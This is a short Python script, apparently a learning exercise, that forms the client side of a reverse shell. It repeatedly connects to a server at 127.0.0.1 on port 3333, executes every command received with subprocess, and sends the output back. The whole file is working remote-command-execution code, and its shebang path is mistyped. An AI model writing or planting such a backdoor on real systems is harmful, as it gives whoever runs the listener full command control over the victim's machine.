#!/use/bin/python3
import subprocess
from socket import *

def client():
    HOST = "127.0.0.1"
    
    c=socket(AF_INET,SOCK_STREAM)
    while True:
        try:
           c.connect((HOST,3333))
           break
        except ConnectionRefusedError:
           pass

    while True:
        cmd = (c.recv(1024)).decode()
        output = subprocess.getoutput(cmd)
        if cmd == "exit":
            break
        c.send(output.encode())


client()
